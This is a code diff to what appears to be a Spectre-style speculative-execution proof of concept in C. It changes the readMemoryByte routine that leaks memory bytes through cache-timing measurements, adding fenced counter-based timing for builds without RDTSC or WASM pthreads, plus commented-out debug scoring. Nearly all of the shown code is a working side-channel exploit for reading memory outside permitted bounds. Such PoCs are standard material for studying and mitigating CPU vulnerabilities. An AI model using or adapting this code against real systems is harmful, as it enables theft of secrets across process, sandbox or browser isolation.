@@ -41,11 +41,11 @@
 #define NORDTSCP
 #endif
 
-#ifdef WASM
-#ifndef __EMSCRIPTEN_PTHREADS__
-assert("No pthreads!");
-#endif /* __EMSCRIPTEN_PTHREADS__ */
-#endif /* WASM */
+// #ifdef WASM
+// #ifndef __EMSCRIPTEN_PTHREADS__
+// assert("No pthreads!");
+// #endif /* __EMSCRIPTEN_PTHREADS__ */
+// #endif /* WASM */
 
 /* Automatically detect if SSE2 is not available when SSE is advertized */
 #ifdef _MSC_VER
@@ -179,7 +179,10 @@ void flush_memory_sse(uint8_t * addr)
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
+  static int results2[256];
   int tries, i, j, k, mix_i;
+  int midx;
+  int midx2;
   unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
@@ -192,7 +195,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif
 
   for (i = 0; i < 256; i++)
+  {
     results[i] = 0;
+    results2[i] = 0;
+  }
   for (tries = 999; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
@@ -290,14 +296,44 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
 #else
+#ifndef NOMFENCE
+      _mm_mfence();
+      reset_counter();
+      _mm_mfence();
+      junk = * addr; /* MEMORY ACCESS TO TIME */
+      _mm_mfence();
+      time2 = get_counter();
+      _mm_mfence();
+      // printf("time2: %d\n", time2);
+#else
+      int m;
+      for (m=0;m<30;m++)
+      {
+        reset_counter();
+        time1 += get_counter();
+      }
       reset_counter();
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = get_counter();
+      // printf("time2: %d\n", time2);
+#endif
 #endif
 #endif
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
+      // if(mix_i != array1[tries % array1_size])
+      //   results2[mix_i] += time2;
     }
+
+    // midx = midx2 = -1;
+    // for (i = 0; i < 256; i++) {
+    //   if (midx < 0 || results2[i] <= results2[midx]) {
+    //     midx2 = midx;
+    //     midx = i;
+    //   } else if (midx2 < 0 || results2[i] <= results2[midx2]) {
+    //     midx2 = i;
+    //   }
+    // }
 
     /* Locate highest & second-highest results results tallies in j/k */
     j = k = -1;
@@ -312,6 +348,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
+  // printf("mins: %d: %d; %d: %d ", midx, results2[midx], midx2, results2[midx2]);
+  // for (i = 0; i < 256; i++) {printf("%d ",results2[i]);}
   value[0] = (uint8_t) j;
   score[0] = results[j];
   value[1] = (uint8_t) k;
@@ -322,12 +360,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 int g_argc              = 0;
 const char * * g_argv = NULL;
 #ifdef NORDTSC
-pthread_t loopc;
-pthread_t get_c;
+int myarray[512] = {45};
 int counter = 0;
 pthread_mutex_t lock;
 int go = 1;
-int myarray[512] = {45};
 int check = 3;
 
 void reset_counter()
@@ -356,6 +392,8 @@ void *loop_counter()
 void *try_time();
 int main(int argc,
   const char * * argv) {
+  pthread_t loopc;
+  pthread_t get_c;
 
   g_argc            = argc;
   g_argv = argv;
